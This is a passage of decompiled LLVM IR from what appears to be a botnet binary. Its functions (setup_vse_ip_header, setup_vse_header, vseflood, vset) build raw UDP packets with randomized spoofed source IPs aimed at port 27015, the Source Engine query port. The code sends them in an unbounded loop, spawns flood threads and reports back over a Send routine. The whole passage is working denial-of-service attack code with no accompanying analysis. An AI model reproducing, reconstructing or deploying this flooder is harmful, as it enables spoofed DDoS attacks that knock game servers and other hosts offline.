  %v1_804c5d2 = or i32 %v3_804c58f, 4
  %v2_804c5d8 = inttoptr i32 %v1_804c5d2 to i32*
  store i32 %v1_804c49b, i32* %v2_804c5d8, align 4
  store i32 %v3_804c58f, i32* @ecx, align 4
  store i32 %v2_804c4ee, i32* %edx.global-to-local, align 4
  %v2_804c5f1 = mul i32 %storemerge54, 4
  %v2_804c5f4 = add i32 %v2_804c5f1, %v2_804c4ee
  store i32 %v2_804c5f4, i32* %eax.global-to-local, align 4
  %v1_804c5f7 = load i32, i32* @esp, align 4
  %v2_804c5f7 = add i32 %v1_804c5f7, -4
  %v3_804c5f7 = inttoptr i32 %v2_804c5f7 to i32*
  store i32 %v3_804c58f, i32* %v3_804c5f7, align 4
  %v1_804c5f8 = add i32 %v1_804c5f7, -8
  %v2_804c5f8 = inttoptr i32 %v1_804c5f8 to i32*
  store i32 134529464, i32* %v2_804c5f8, align 4
  %v1_804c5fd = add i32 %v1_804c5f7, -12
  %v2_804c5fd = inttoptr i32 %v1_804c5fd to i32*
  store i32 0, i32* %v2_804c5fd, align 4
  %v0_804c5ff = load i32, i32* %eax.global-to-local, align 4
  %v2_804c5ff = add i32 %v1_804c5f7, -16
  %v3_804c5ff = inttoptr i32 %v2_804c5ff to i32*
  store i32 %v0_804c5ff, i32* %v3_804c5ff, align 4
  %v0_804c600 = call i32 @pthread_create()
  %v0_804c605 = load i32, i32* @esp, align 4
  %v1_804c605 = add i32 %v0_804c605, 16
  %v4_804c608 = add nuw nsw i32 %storemerge54, 1
  store i32 %v4_804c608, i32* %eax.global-to-local, align 4
  %exitcond = icmp eq i32 %v4_804c608, %v1_804c46d
  br i1 %exitcond, label %dec_label_pc_804c617, label %dec_label_pc_804c579

dec_label_pc_804c617:                             ; preds = %dec_label_pc_804c579, %dec_label_pc_804c461
  %v1_804c61f.lcssa = phi i32 [ %v2_804c54c, %dec_label_pc_804c461 ], [ %v1_804c605, %dec_label_pc_804c579 ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_804c461 ], [ %v1_804c46d, %dec_label_pc_804c579 ]
  store i32 %v1_804c51e, i32* %eax.global-to-local, align 4
  %v2_804c61d = load i32, i32* %v1_804c521, align 4
  store i32 %v2_804c61d, i32* %eax.global-to-local, align 4
  %v2_804c61f = add i32 %v1_804c61f.lcssa, -4
  %v3_804c61f = inttoptr i32 %v2_804c61f to i32*
  store i32 %v2_804c61d, i32* %v3_804c61f, align 4
  %v5_804c620 = add i32 %v1_804c61f.lcssa, -8
  %v6_804c620 = inttoptr i32 %v5_804c620 to i32*
  store i32 %arg2, i32* %v6_804c620, align 4
  %v1_804c623 = add i32 %v1_804c61f.lcssa, -12
  %v2_804c623 = inttoptr i32 %v1_804c623 to i32*
  store i32 ptrtoint ([29 x i8]* @global_var_806942a.168 to i32), i32* %v2_804c623, align 4
  %v5_804c628 = add i32 %v1_804c61f.lcssa, -16
  %v6_804c628 = inttoptr i32 %v5_804c628 to i32*
  store i32 %arg1, i32* %v6_804c628, align 4
  %v1_804c62b = load i32, i32* %stack_var_-4, align 4
  %v2_804c62b = call i32 @Send(i32 %storemerge.lcssa, i32 %v1_804c62b)
  %v0_804c630 = load i32, i32* @esp, align 4
  store i32 %v1_804c47b, i32* %eax.global-to-local, align 4
  %v2_804c640 = load i32, i32* %v1_804c47e, align 4
  store i32 %v2_804c640, i32* %eax.global-to-local, align 4
  %v3_804c645 = inttoptr i32 %v0_804c630 to i32*
  store i32 %v2_804c640, i32* %v3_804c645, align 4
  %v1_804c646 = call i32 @atol(i32 0)
  %v0_804c64b = load i32, i32* @esp, align 4
  %v9_804c64e = mul i32 %v1_804c646, 20
  store i32 %v9_804c64e, i32* %eax.global-to-local, align 4
  %v7_804c655 = icmp sgt i32 %v9_804c64e, 0
  br i1 %v7_804c655, label %dec_label_pc_804c65b, label %dec_label_pc_804c737

dec_label_pc_804c65b:                             ; preds = %dec_label_pc_804c617
  store i32 5000, i32* %edx.global-to-local, align 4
  store i32 50000, i32* %eax.global-to-local, align 4
  %v3_804c689 = inttoptr i32 %v0_804c64b to i32*
  store i32 50000, i32* %v3_804c689, align 4
  %v2_804c68a = call i32 @usleep(i64 0)
  %v0_804c692 = load i64, i64* @global_var_807d500.88, align 8
  %sext12 = mul i64 %v0_804c692, 4294967296
  %v2_804c69b = sdiv i64 %sext12, 4294967296
  %v4_804c69b = mul nsw i64 %v2_804c69b, 20
  %v5_804c69b = trunc i64 %v4_804c69b to i32
  store i32 %v5_804c69b, i32* %edx.global-to-local, align 4
  %tmp57 = icmp ugt i32 %v5_804c69b, %v1_804c484
  %v0_804c6ca = load i32, i32* @global_var_807d3c8.89, align 8
  store i32 %v0_804c6ca, i32* %eax.global-to-local, align 4
  br i1 %tmp57, label %dec_label_pc_804c6a5, label %dec_label_pc_804c6ca

dec_label_pc_804c6a5:                             ; preds = %dec_label_pc_804c65b
  %tmp46 = icmp slt i32 %v0_804c6ca, 1
  %tmp47 = icmp eq i1 %tmp46, false
  br i1 %tmp47, label %dec_label_pc_804c6bd, label %dec_label_pc_804c6ae

dec_label_pc_804c6ae:                             ; preds = %dec_label_pc_804c6a5
  %v0_804c6ae = load i32, i32* @global_var_806ffa8.90, align 8
  %v1_804c6b3 = add i32 %v0_804c6ae, 100
  store i32 %v1_804c6b3, i32* %eax.global-to-local, align 4
  store i32 %v1_804c6b3, i32* @global_var_806ffa8.90, align 8
  br label %dec_label_pc_804c6f8

dec_label_pc_804c6bd:                             ; preds = %dec_label_pc_804c6a5
  %v1_804c6c2 = add i32 %v0_804c6ca, -1
  store i32 %v1_804c6c2, i32* %eax.global-to-local, align 4
  store i32 %v1_804c6c2, i32* @global_var_807d3c8.89, align 8
  br label %dec_label_pc_804c6f8

dec_label_pc_804c6ca:                             ; preds = %dec_label_pc_804c65b
  %v1_804c6cf = add i32 %v0_804c6ca, 1
  store i32 %v1_804c6cf, i32* @global_var_807d3c8.89, align 8
  %v0_804c6d5 = load i32, i32* @global_var_806ffa8.90, align 8
  store i32 %v0_804c6d5, i32* %eax.global-to-local, align 4
  %v1_804c6da = add i32 %v0_804c6d5, -25
  %v5_804c6da = icmp ult i32 %v0_804c6d5, 25
  %v9_804c6da = icmp eq i32 %v1_804c6da, 0
  %v2_804c6dd = or i1 %v5_804c6da, %v9_804c6da
  br i1 %v2_804c6dd, label %dec_label_pc_804c6ee, label %dec_label_pc_804c6df

dec_label_pc_804c6df:                             ; preds = %dec_label_pc_804c6ca
  store i32 %v1_804c6da, i32* %eax.global-to-local, align 4
  store i32 %v1_804c6da, i32* @global_var_806ffa8.90, align 8
  br label %dec_label_pc_804c6f8

dec_label_pc_804c6ee:                             ; preds = %dec_label_pc_804c6ca
  store i32 0, i32* @global_var_806ffa8.90, align 8
  br label %dec_label_pc_804c6f8

dec_label_pc_804c6f8:                             ; preds = %dec_label_pc_804c6df, %dec_label_pc_804c6bd, %dec_label_pc_804c6ae, %dec_label_pc_804c6ee
  store i64 0, i64* @global_var_807d500.88, align 256
  %v5_804c71a = add i32 %v1_804c4b2, %v2_804c3f3
  br label %dec_label_pc_804c702

dec_label_pc_804c702:                             ; preds = %dec_label_pc_804c732, %dec_label_pc_804c6f8
  %stack_var_-12.0 = phi i32 [ %tmp, %dec_label_pc_804c6f8 ], [ %v4_804c732, %dec_label_pc_804c732 ]
  %tmp56 = icmp ult i32 %stack_var_-12.0, 100
  br i1 %tmp56, label %dec_label_pc_804c732, label %dec_label_pc_804c708

dec_label_pc_804c708:                             ; preds = %dec_label_pc_804c702
  %v0_804c708 = load i32, i32* @esp, align 4
  %v1_804c70b = add i32 %v0_804c708, -16
  %v2_804c70b = inttoptr i32 %v1_804c70b to i32*
  store i32 0, i32* %v2_804c70b, align 4
  %v2_804c70d = call i32 @__GI_time(i32* null)
  %v0_804c712 = load i32, i32* @esp, align 4
  store i32 %v2_804c70d, i32* %edx.global-to-local, align 4
  store i32 %v5_804c71a, i32* %eax.global-to-local, align 4
  %v7_804c71d = icmp ult i32 %v2_804c70d, %v5_804c71a
  br i1 %v7_804c71d, label %dec_label_pc_804c732, label %dec_label_pc_804c721

dec_label_pc_804c721:                             ; preds = %dec_label_pc_804c708
  %v2_804c724 = inttoptr i32 %v0_804c712 to i32*
  store i32 0, i32* %v2_804c724, align 4
  %v1_804c726 = call i32 @__GI_exit(i32 0)
  store i32 %v1_804c726, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c732

dec_label_pc_804c732:                             ; preds = %dec_label_pc_804c721, %dec_label_pc_804c708, %dec_label_pc_804c702
  %stack_var_-12.1 = phi i32 [ %stack_var_-12.0, %dec_label_pc_804c702 ], [ 0, %dec_label_pc_804c708 ], [ 0, %dec_label_pc_804c721 ]
  %v4_804c732 = add i32 %stack_var_-12.1, 1
  br label %dec_label_pc_804c702

dec_label_pc_804c737:                             ; preds = %dec_label_pc_804c617
  %v2_804c73a = inttoptr i32 %v0_804c64b to i32*
  store i32 0, i32* %v2_804c73a, align 4
  %v1_804c73c = call i32 @__GI_exit(i32 %tmp)
  store i32 %v1_804c73c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c741

dec_label_pc_804c741:                             ; preds = %entry, %dec_label_pc_804c737
  %v0_804c745 = phi i32 [ %v1_804c404, %entry ], [ %v1_804c73c, %dec_label_pc_804c737 ]
  ret i32 %v0_804c745

; uselistorder directives
  uselistorder i32 %stack_var_-12.0, { 1, 0 }
  uselistorder i32 %v1_804c6da, { 1, 0, 2 }
  uselistorder i32 %v0_804c6ca, { 2, 1, 0, 3 }
  uselistorder i32 %v9_804c64e, { 1, 0 }
  uselistorder i32 %v0_804c64b, { 1, 0 }
  uselistorder i32 %v3_804c58f, { 1, 0, 2, 3 }
  uselistorder i32 %v1_804c585, { 0, 2, 1 }
  uselistorder i32 %storemerge54, { 2, 0, 1, 3 }
  uselistorder i32 %v1_804c506, { 1, 0 }
  uselistorder i32 %v2_804c4ee, { 0, 2, 1 }
  uselistorder i32 %v1_804c49b, { 1, 0 }
  uselistorder i32 %v1_804c46d, { 0, 1, 2, 4, 5, 3 }
  uselistorder i32 %v4_804c43b, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder i32* %stack_var_-108, { 0, 1, 2, 4, 3 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 16, 14, 15, 34, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder i32 %arg4, { 4, 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804c741, { 1, 0 }
  uselistorder label %dec_label_pc_804c6f8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804c461, { 1, 0 }
  uselistorder label %dec_label_pc_804c43b, { 1, 0 }
}

define i32 @setup_vse_ip_header(i8* %arg1) local_unnamed_addr {
entry:
  %stack_var_-33 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804c749 = load i32, i32* @edi, align 4
  %v0_804c74a = load i32, i32* @esi, align 4
  %v0_804c74b = load i32, i32* @ebx, align 4
  store i32 %v0_804c74b, i32* %stack_var_-16, align 4
  %v4_804c74f = ptrtoint i8* %arg1 to i32
  store i8 69, i8* %arg1, align 1
  %v1_804c76c = add i32 %v4_804c74f, 1
  %v2_804c76c = inttoptr i32 %v1_804c76c to i8*
  store i8 0, i8* %v2_804c76c, align 1
  %v1_804c773 = add i32 %v4_804c74f, 2
  %v2_804c773 = inttoptr i32 %v1_804c773 to i16*
  store i16 53, i16* %v2_804c773, align 2
  %v1_804c781 = call i32 @htonl(i32 54321)
  %v2_804c781 = trunc i32 %v1_804c781 to i16
  %v3_804c78e = add i32 %v4_804c74f, 4
  %v4_804c78e = inttoptr i32 %v3_804c78e to i16*
  store i16 %v2_804c781, i16* %v4_804c78e, align 2
  %v1_804c795 = add i32 %v4_804c74f, 6
  %v2_804c795 = inttoptr i32 %v1_804c795 to i16*
  store i16 0, i16* %v2_804c795, align 2
  %v1_804c79e = add i32 %v4_804c74f, 8
  %v2_804c79e = inttoptr i32 %v1_804c79e to i8*
  store i8 -1, i8* %v2_804c79e, align 1
  %v1_804c7a5 = add i32 %v4_804c74f, 9
  %v2_804c7a5 = inttoptr i32 %v1_804c7a5 to i8*
  store i8 17, i8* %v2_804c7a5, align 1
  %v1_804c7ac = add i32 %v4_804c74f, 10
  %v2_804c7ac = inttoptr i32 %v1_804c7ac to i16*
  store i16 0, i16* %v2_804c7ac, align 2
  %v2_804c7bc = call i32 @realrand(i32 1, i32 255)
  store i32 %v2_804c7bc, i32* @esi, align 4
  %v2_804c7d0 = call i32 @realrand(i32 1, i32 255)
  store i32 %v2_804c7d0, i32* @edi, align 4
  %v2_804c7e4 = call i32 @realrand(i32 1, i32 255)
  store i32 %v2_804c7e4, i32* @ebx, align 4
  %v2_804c7f8 = call i32 @realrand(i32 1, i32 255)
  %v0_804c803 = load i32, i32* @esi, align 4
  %v0_804c804 = load i32, i32* @edi, align 4
  %v0_804c805 = load i32, i32* @ebx, align 4
  %v2_804c80e = ptrtoint i32* %stack_var_-33 to i32
  %v8_804c812 = call i32 @__GI_snprintf(i32 %v2_804c80e, i32 16, i32 ptrtoint ([12 x i8]* @global_var_80693b7.162 to i32), i32 %v2_804c7f8, i32 %v0_804c805, i32 %v0_804c804, i32 %v0_804c803)
  %v1_804c821 = call i32 @inet_addr(i32 %v2_804c80e)
  %v3_804c82e = add i32 %v4_804c74f, 12
  %v4_804c82e = inttoptr i32 %v3_804c82e to i32*
  store i32 %v1_804c821, i32* %v4_804c82e, align 4
  %v2_804c834 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804c834, i32* @ebx, align 4
  store i32 %v0_804c74a, i32* @esi, align 4
  store i32 %v0_804c749, i32* @edi, align 4
  ret i32 %v4_804c74f
}

define i32 @setup_vse_header(i16* %arg1) local_unnamed_addr {
entry:
  %v1_804c849 = call i32 @htons(i32 27015)
  %v2_804c849 = trunc i32 %v1_804c849 to i16
  %v4_804c853 = ptrtoint i16* %arg1 to i32
  store i16 %v2_804c849, i16* %arg1, align 2
  %v1_804c861 = call i32 @htons(i32 27015)
  %v2_804c861 = trunc i32 %v1_804c861 to i16
  %v3_804c86e = add i32 %v4_804c853, 2
  %v4_804c86e = inttoptr i32 %v3_804c86e to i16*
  store i16 %v2_804c861, i16* %v4_804c86e, align 2
  %v1_804c875 = add i32 %v4_804c853, 6
  %v2_804c875 = inttoptr i32 %v1_804c875 to i16*
  store i16 0, i16* %v2_804c875, align 2
  %v1_804c87e = add i32 %v4_804c853, 8
  %v1_804c887 = inttoptr i32 %v1_804c87e to i32*
  store i32 -1, i32* %v1_804c887, align 4
  %v1_804c890 = add i32 %v4_804c853, 12
  %v1_804c893 = inttoptr i32 %v1_804c890 to i8*
  store i1 false, i1* @df, align 1
  %v7_804c8a0 = call i8* @_memcpy(i8* %v1_804c893, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @global_var_8069447.169, i32 0, i32 0), i32 21)
  %v1_804c8a7 = call i32 @htons(i32 33)
  %v2_804c8a7 = trunc i32 %v1_804c8a7 to i16
  %v4_804c8b4 = add i32 %v4_804c853, 4
  %v5_804c8b4 = inttoptr i32 %v4_804c8b4 to i16*
  store i16 %v2_804c8a7, i16* %v5_804c8b4, align 2
  ret i32 %v4_804c853

; uselistorder directives
  uselistorder i32 %v4_804c853, { 0, 1, 3, 2, 4, 5 }
  uselistorder i16* %arg1, { 1, 0 }
}

define i32 @vseflood(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4140 = alloca i32, align 4
  %stack_var_-4188 = alloca i32, align 4
  %stack_var_-4144 = alloca i32, align 4
  %stack_var_-4124 = alloca i32, align 4
  %stack_var_-4156 = alloca i32, align 4
  %v2_804c8cf = ptrtoint i32* %stack_var_-4124 to i32
  %v1_804c8db = add i32 %v2_804c8cf, 20
  store i32 2, i32* %stack_var_-4140, align 4
  %v1_804c8f2 = call i32 @htons(i32 17015)
  %v1_804c907 = call i32 @inet_addr(i32 %arg1)
  %v3_804c91e = call i32 @socket(i32 2, i32 3, i32 17)
  %v5_804c929 = icmp slt i32 %v3_804c91e, 0
  %v1_804c92d = icmp eq i1 %v5_804c929, false
  br i1 %v1_804c92d, label %dec_label_pc_804c939, label %dec_label_pc_804c92f

dec_label_pc_804c92f:                             ; preds = %entry
  %v1_804c934 = call i32 @__GI_exit(i32 -1)
  br label %dec_label_pc_804c939

dec_label_pc_804c939:                             ; preds = %entry, %dec_label_pc_804c92f
  %v3_804c94d = bitcast i32* %stack_var_-4124 to i8*
  %v4_804c94d = call i32 @__GI_memset(i8* %v3_804c94d, i32 0, i32 4096)
  store i32 %v4_804c94d, i32* @eax, align 4
  %v2_804c95b = call i32 @setup_vse_ip_header(i8* %v3_804c94d)
  %v1_804c969 = inttoptr i32 %v1_804c8db to i16*
  %v2_804c969 = call i32 @setup_vse_header(i16* %v1_804c969)
  %v2_804c97a = add i32 %v2_804c8cf, 16
  %v3_804c97a = inttoptr i32 %v2_804c97a to i32*
  store i32 %v1_804c907, i32* %v3_804c97a, align 4
  %v1_804c980 = or i32 %v2_804c8cf, 2
  %v2_804c980 = inttoptr i32 %v1_804c980 to i16*
  %v3_804c980 = load i16, i16* %v2_804c980, align 2
  %v4_804c980 = zext i16 %v3_804c980 to i32
  %v2_804c991 = bitcast i32* %stack_var_-4124 to i16*
  %v3_804c991 = call i32 @csum(i16* %v2_804c991, i32 %v4_804c980)
  %v4_804c991 = trunc i32 %v3_804c991 to i16
  %v3_804c99e = add i32 %v2_804c8cf, 10
  %v4_804c99e = inttoptr i32 %v3_804c99e to i16*
  store i16 %v4_804c991, i16* %v4_804c99e, align 2
  store i32 1, i32* %stack_var_-4144, align 4
  %v2_804c9ac = ptrtoint i32* %stack_var_-4144 to i32
  store i32 %v3_804c91e, i32* %stack_var_-4188, align 4
  %v5_804c9c4 = call i32 @__GI_setsockopt(i32 %v3_804c91e, i32 0, i32 3, i32 %v2_804c9ac, i32 4)
  %v2_804c9cc = icmp slt i32 %v5_804c9c4, 0
  %v1_804c9ce = icmp eq i1 %v2_804c9cc, false
  br i1 %v1_804c9ce, label %dec_label_pc_804c9da, label %dec_label_pc_804c9d0

dec_label_pc_804c9d0:                             ; preds = %dec_label_pc_804c939
  %v1_804c9d5 = call i32 @__GI_exit(i32 -1)
  br label %dec_label_pc_804c9da

dec_label_pc_804c9da:                             ; preds = %dec_label_pc_804c939, %dec_label_pc_804c9d0
  %v2_804c9df = call i32 @__GI_time(i32* null)
  %v1_804c9e8 = call i32 @init_rand(i32 %v2_804c9df)
  %v2_804c9fa = ptrtoint i32* %stack_var_-4140 to i32
  %v2_804ca6e = add i32 %v2_804c8cf, 12
  %v3_804ca6e = inttoptr i32 %v2_804ca6e to i32*
  %v3_804ca87 = add i32 %v2_804c8cf, 4
  %v4_804ca87 = inttoptr i32 %v3_804ca87 to i16*
  br label %dec_label_pc_804c9fa

dec_label_pc_804c9fa:                             ; preds = %dec_label_pc_804cae3, %dec_label_pc_804c9da
  %storemerge = phi i32 [ %v4_804cae3, %dec_label_pc_804cae3 ], [ 0, %dec_label_pc_804c9da ]
  store i32 %storemerge, i32* %stack_var_-4156, align 4
  %v3_804ca03 = load i16, i16* %v2_804c980, align 2
  %v4_804ca03 = zext i16 %v3_804ca03 to i32
  store i32 %v3_804c91e, i32* %stack_var_-4188, align 4
  %v6_804ca1f = call i32 @sendto(i32 %v3_804c91e, i32 %v2_804c8cf, i32 %v4_804ca03, i32 0, i32 %v2_804c9fa, i32 16)
  %v1_804ca27 = call i32 @rand_cmwc(i32 %v3_804c91e)
  %v2_804ca2c = urem i32 %v1_804ca27, 16777216
  %v2_804ca36 = sub i32 %v1_804ca27, %v2_804ca2c
  store i32 %v2_804ca36, i32* @ebx, align 4
  %v1_804ca39 = call i32 @rand_cmwc(i32 %v3_804c91e)
  %sext = mul i32 %v1_804ca39, 65536
  %v1_804ca3e = sdiv i32 %sext, 65536
  %v1_804ca41 = and i32 %v1_804ca3e, 16711680
  %v0_804ca49 = load i32, i32* @ebx, align 4
  %v2_804ca49 = or i32 %v1_804ca41, %v0_804ca49
  store i32 %v2_804ca49, i32* @ebx, align 4
  %v0_804ca4b = load i32, i32* %stack_var_-4188, align 4
  %v1_804ca4b = call i32 @rand_cmwc(i32 %v0_804ca4b)
  %sext1 = mul i32 %v1_804ca4b, 16777216
  %v1_804ca50 = sdiv i32 %sext1, 16777216
  %v1_804ca53 = and i32 %v1_804ca50, 65280
  %v0_804ca5b = load i32, i32* @ebx, align 4
  %v2_804ca5b = or i32 %v1_804ca53, %v0_804ca5b
  store i32 %v2_804ca5b, i32* @ebx, align 4
  %v0_804ca5d = load i32, i32* %stack_var_-4188, align 4
  %v1_804ca5d = call i32 @rand_cmwc(i32 %v0_804ca5d)
  %v1_804ca62 = urem i32 %v1_804ca5d, 256
  %v0_804ca67 = load i32, i32* @ebx, align 4
  %v2_804ca69 = or i32 %v0_804ca67, %v1_804ca62
  store i32 %v2_804ca69, i32* %v3_804ca6e, align 4
  %v0_804ca71 = load i32, i32* %stack_var_-4188, align 4
  %v1_804ca71 = call i32 @rand_cmwc(i32 %v0_804ca71)
  %v1_804ca7a = call i32 @htonl(i32 %v1_804ca71)
  %v2_804ca7a = trunc i32 %v1_804ca7a to i16
  store i16 %v2_804ca7a, i16* %v4_804ca87, align 4
  %v3_804ca8e = load i16, i16* %v2_804c980, align 2
  %v4_804ca8e = zext i16 %v3_804ca8e to i32
  %v3_804ca9f = call i32 @csum(i16* %v2_804c991, i32 %v4_804ca8e)
  %v4_804ca9f = trunc i32 %v3_804ca9f to i16
  store i16 %v4_804ca9f, i16* %v4_804c99e, align 2
  %v0_804cab0 = load i64, i64* @global_var_807d500.88, align 8
  %v1_804cab0 = trunc i64 %v0_804cab0 to i32
  %v1_804cab5 = add i32 %v1_804cab0, 1
  %v1_804cab6 = sext i32 %v1_804cab5 to i64
  store i64 %v1_804cab6, i64* @global_var_807d500.88, align 256
  %v0_804cabb = load i32, i32* @global_var_807d3c8.89, align 8
  %v4_804cac0 = load i32, i32* %stack_var_-4156, align 4
  %v6_804cac6 = icmp ugt i32 %v0_804cabb, %v4_804cac0
  br i1 %v6_804cac6, label %dec_label_pc_804c9fa.dec_label_pc_804cae3_crit_edge, label %dec_label_pc_804cac8

dec_label_pc_804c9fa.dec_label_pc_804cae3_crit_edge: ; preds = %dec_label_pc_804c9fa
  br label %dec_label_pc_804cae3

dec_label_pc_804cac8:                             ; preds = %dec_label_pc_804c9fa
  store i32 0, i32* %stack_var_-4156, align 4
  %v0_804cad2 = load i32, i32* @global_var_806ffa8.90, align 8
  %v1_804cadb = sext i32 %v0_804cad2 to i64
  %v2_804cadb = call i32 @usleep(i64 %v1_804cadb)
  br label %dec_label_pc_804cae3

dec_label_pc_804cae3:                             ; preds = %dec_label_pc_804c9fa.dec_label_pc_804cae3_crit_edge, %dec_label_pc_804cac8
  %v3_804cae3 = phi i32 [ %v4_804cac0, %dec_label_pc_804c9fa.dec_label_pc_804cae3_crit_edge ], [ 0, %dec_label_pc_804cac8 ]
  %v4_804cae3 = add i32 %v3_804cae3, 1
  br label %dec_label_pc_804c9fa

; uselistorder directives
  uselistorder i32 %v3_804c91e, { 0, 1, 3, 2, 5, 4, 6 }
  uselistorder i32 %v2_804c8cf, { 0, 2, 3, 4, 1, 5, 6 }
  uselistorder i32* %stack_var_-4156, { 1, 2, 0 }
  uselistorder i32* %stack_var_-4144, { 1, 0 }
  uselistorder i32* %stack_var_-4188, { 0, 2, 1, 3, 4 }
  uselistorder i32* %stack_var_-4140, { 1, 0 }
  uselistorder label %dec_label_pc_804cae3, { 1, 0 }
  uselistorder label %dec_label_pc_804c9da, { 1, 0 }
  uselistorder label %dec_label_pc_804c939, { 1, 0 }
}

define i32 @vset(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804caee = load i32, i32* @ebp, align 4
  store i32 %v0_804caee, i32* %stack_var_-4, align 4
  %v4_804caee = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804caee, i32* @ebp, align 4
  %v15_804caf1 = ptrtoint i32* %stack_var_-60 to i32
  store i32 %v15_804caf1, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-76, align 4
  %v3_804cafc = ptrtoint i32* %stack_var_-76 to i32
  %v2_804cafe = call i32 @__GI_time(i32* null)
  store i32 %v2_804cafe, i32* @eax, align 4
  store i32 %arg2, i32* %stack_var_-76, align 4
  %v1_804cb0f = call i32 @mfork(i32 %arg2)
  store i32 %v1_804cb0f, i32* %eax.global-to-local, align 4
  %v1_804cb17 = icmp eq i32 %v1_804cb0f, 0
  %v1_804cb19 = icmp eq i1 %v1_804cb17, false
  br i1 %v1_804cb19, label %dec_label_pc_804cd5b, label %dec_label_pc_804cb1f

dec_label_pc_804cb1f:                             ; preds = %entry
  store i32 2, i32* %stack_var_-76, align 4
  %v3_804cb2b = call i32 @socket(i32 2, i32 3, i32 255)
  store i32 %v3_804cb2b, i32* %eax.global-to-local, align 4
  %v5_804cb36 = icmp slt i32 %v3_804cb2b, 0
  %v1_804cb3a = icmp eq i1 %v5_804cb36, false
  br i1 %v1_804cb3a, label %dec_label_pc_804cb46, label %dec_label_pc_804cb3c

dec_label_pc_804cb3c:                             ; preds = %dec_label_pc_804cb1f
  store i32 1, i32* %stack_var_-76, align 4
  %v1_804cb41 = call i32 @__GI_exit(i32 1)
  store i32 %v1_804cb41, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804cb46

dec_label_pc_804cb46:                             ; preds = %dec_label_pc_804cb1f, %dec_label_pc_804cb3c
  %v4_804cb46 = add i32 %arg3, -3
  %v9_804cb46 = sub i32 2, %arg3
  %v10_804cb46 = and i32 %v9_804cb46, %arg3
  %v11_804cb46 = icmp slt i32 %v10_804cb46, 0
  %v12_804cb46 = icmp eq i32 %v4_804cb46, 0
  %v13_804cb46 = icmp slt i32 %v4_804cb46, 0
  %v3_804cb4a = icmp eq i1 %v13_804cb46, %v11_804cb46
  %v4_804cb4a = icmp eq i1 %v12_804cb46, false
  %v5_804cb4a = and i1 %v4_804cb4a, %v3_804cb4a
  br i1 %v5_804cb4a, label %dec_label_pc_804cb46.dec_label_pc_804cb6c_crit_edge, label %dec_label_pc_804cb4c

dec_label_pc_804cb46.dec_label_pc_804cb6c_crit_edge: ; preds = %dec_label_pc_804cb46
  br label %dec_label_pc_804cb6c

dec_label_pc_804cb4c:                             ; preds = %dec_label_pc_804cb46
  %v3_804cb5a = call i32 @Send(i32 %arg1, i32 ptrtoint ([90 x i8]* @global_var_806945c.170 to i32))
  store i32 %v3_804cb5a, i32* %eax.global-to-local, align 4
  %v1_804cb67 = call i32 @__GI_exit(i32 -1)
  store i32 %v1_804cb67, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804cb6c

dec_label_pc_804cb6c:                             ; preds = %dec_label_pc_804cb46.dec_label_pc_804cb6c_crit_edge, %dec_label_pc_804cb4c
  %v1_804cb6f = add i32 %arg4, 8
  store i32 %v1_804cb6f, i32* %eax.global-to-local, align 4
  %v1_804cb72 = inttoptr i32 %v1_804cb6f to i32*
  %v2_804cb72 = load i32, i32* %v1_804cb72, align 4
  store i32 %v2_804cb72, i32* %eax.global-to-local, align 4
  %v1_804cb78 = call i32 @atol(i32 %v2_804cb72)
  %v1_804cb86 = add i32 %arg4, 12
  store i32 %v1_804cb86, i32* %eax.global-to-local, align 4
  %v1_804cb89 = inttoptr i32 %v1_804cb86 to i32*
  %v2_804cb89 = load i32, i32* %v1_804cb89, align 4
  store i32 %v2_804cb89, i32* %eax.global-to-local, align 4
  %v1_804cb8f = call i32 @atol(i32 %v2_804cb89)
  %v1_804cb9d = add i32 %arg4, 16
  store i32 %v1_804cb9d, i32* %eax.global-to-local, align 4
  %v1_804cba0 = inttoptr i32 %v1_804cb9d to i32*
  %v2_804cba0 = load i32, i32* %v1_804cba0, align 4
  store i32 %v2_804cba0, i32* %eax.global-to-local, align 4
  %v1_804cba6 = call i32 @atol(i32 %v2_804cba0)
  store i32 0, i32* @global_var_807d3c8.89, align 8
  store i64 0, i64* @global_var_807d500.88, align 256
  %v2_804cbc8 = mul i32 %v1_804cb78, 4
  %v1_804cbce = add i32 %v2_804cbc8, 30
  %v2_804cbd1 = and i32 %v1_804cbce, -16
  %v2_804cbd7 = sub i32 %v3_804cafc, %v2_804cbd1
  %v1_804cbdf = add i32 %v2_804cbd7, 15
  %v2_804cbe2 = and i32 %v1_804cbdf, -16
  store i32 %v2_804cbe2, i32* %stack_var_-60, align 4
  %v1_804cc04 = add i32 %arg4, 4
  %v1_804cc07 = inttoptr i32 %v1_804cc04 to i32*
  %v5_804cc2f38 = icmp sgt i32 %v1_804cb78, 0
  store i32 %v1_804cc04, i32* %eax.global-to-local, align 4
  %v2_804cc0739 = load i32, i32* %v1_804cc07, align 4
  br i1 %v5_804cc2f38, label %dec_label_pc_804cc01, label %dec_label_pc_804cc31

dec_label_pc_804cc01:                             ; preds = %dec_label_pc_804cb6c, %dec_label_pc_804cc01
  %v2_804cc0742 = phi i32 [ %v2_804cc07, %dec_label_pc_804cc01 ], [ %v2_804cc0739, %dec_label_pc_804cb6c ]
